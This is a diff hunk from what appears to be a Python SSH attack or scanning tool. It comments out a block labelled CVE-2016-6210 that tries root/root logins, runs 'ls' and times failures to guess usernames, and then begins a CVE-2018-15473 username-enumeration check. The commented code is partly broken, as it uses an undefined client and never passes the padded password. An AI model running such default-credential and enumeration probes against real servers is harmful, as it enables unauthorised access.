@@ -215,24 +215,24 @@ def TelnetConnect():
 
 def SSHConnect():
 	try:
-		print('Using CVE:2016-6210')
-		SSH = paramiko.SSHClient()
-		p = 'A'*25000
-		starttime=time.clock()
-		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-		try:
-			SSH.connect(address, username='root', password='root')
-			stdin, stdout, stderr = client.exec_command('ls')
-			for line in stdout:
-				print('... ' + line.strip('\n'))
-				client.close()
-				f.append(address)
-		except:
-			endtime=time.clock()
-			f.append(address)
-			total=endtime-starttime
-			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
-			print(total)
+#		print('Using CVE:2016-6210')
+#		SSH = paramiko.SSHClient()
+#		p = 'A'*25000
+#		starttime=time.clock()
+#		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+#		try:
+#			SSH.connect(address, username='root', password='root')
+#			stdin, stdout, stderr = client.exec_command('ls')
+#			for line in stdout:
+#				print('... ' + line.strip('\n'))
+#				client.close()
+#				f.append(address)
+#		except:
+#			endtime=time.clock()
+#			f.append(address)
+#			total=endtime-starttime
+#			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
+#			print(total)
 		try:
 			print('Using CVE:2018-15473')
 			SSHsocket = socket.socket()
